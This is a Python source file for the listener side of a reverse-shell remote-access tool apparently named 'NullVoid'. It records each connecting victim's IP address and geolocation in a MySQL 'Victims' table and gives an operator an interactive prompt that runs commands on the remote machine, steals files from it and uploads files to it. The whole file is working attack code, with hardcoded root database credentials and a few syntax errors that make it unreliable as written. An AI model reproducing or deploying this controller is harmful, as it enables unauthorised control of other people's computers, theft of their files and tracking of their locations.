import socket
import os
import time
import mysql.connector as sql
import geocoder

db = sql.connect(user='root', password='password', host='localhost', database='NullVoid')
db_cur = db.cursor()
db_cur.execute("CREATE TABLE Victims(IP_Addr varchar(30) NOT NULL, Location varchar(50), Latitude varchar(50), Longitude varchar(50)")


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 5555))
    s.listen(1)
    print ('[Info] Listening for incoming TCP connection on port 5555')

    conn, addr = s.accept()
    print ('[+] We got a connection from: ', addr)
    
    g = geocoder.ip(addr)
    location = g.city
    latitude = g.latlng[0]
    longitude = g.latlng[1]
    query = "INSERT INTO Victims(IP_Addr, Location, Latitude, Longitude) VALUES (%s, %s, %s, %s)")
    values = (addr, location, latitude, longitude)
    db_cur.execute(query, values)

    cwd = 'Shell'
    r = conn.recv(5120).decode('utf-8')

    if ('dir:' in r):
        
        cwd = r[4:]

    while True:

        command = input(str(cwd) + ":> ")

        if 'terminate' in command:

            conn.send('terminate'.encode('utf-8'))
            conn.close()
            break
            
        elif 'grab' in command:

            conn.send(command.encode('utf-8'))
            file_name = conn.recv(1024).decode('utf-8')
            print("[+] Grabbing [" + file_name + "]...")
            conn.send('OK'.encode('utf-8'))
            file_size = conn.recv(1024).decode('utf-8')
            conn.send('OK'.encode('utf-8'))
            print("[Info] Total: " + str(int(file_size)/1024) + " KB")

            with open(file_name, "wb") as file:
                
                c = 0
                start_time = time.time()
                
                while c < int(file_size):

                    data = conn.recv(1024)
                    
                    if not (data):
                        break
                        
                    file.write(data)
                    c += len(data)

                end_time = time.time()

            print("[+] File Grabbed. Total time: ", end_time - start_time)

        elif 'transfer' in command:
            conn.send(command.encode('utf-8'))
            file_name = command[9:]
            file_size = os.path.getsize(file_name)
            conn.send(file_name.encode('utf-8'))
            print(conn.recv(1024).decode('utf-8'))
            conn.send(str(file_size).encode('utf-8'))
            print("Getting Response")
            print(conn.recv(1024).decode('utf-8'))
            print("[+] Transferring [" + str(file_size/1024) + "] KB...")

            with open(file_name, "rb") as file:

                c = 0
                start_time = time.time()

                while c < int(file_size):

                    data = file.read(1024)
                    
                    if not (data):
                        break

                    conn.sendall(data)
                    c += len(data)

                end_time = time.time()
                
                print("[+] File Transferred. Total time: ", end_time - start_time)

        elif (len(command.strip()) > 0):

            conn.send(command.encode('utf-8'))
            r = conn.recv(5120).decode('utf-8')

            if ('dir:' in r):

                cwd = r[4:]
                
            else:

                print (r)

def main ():
    connect()

main()
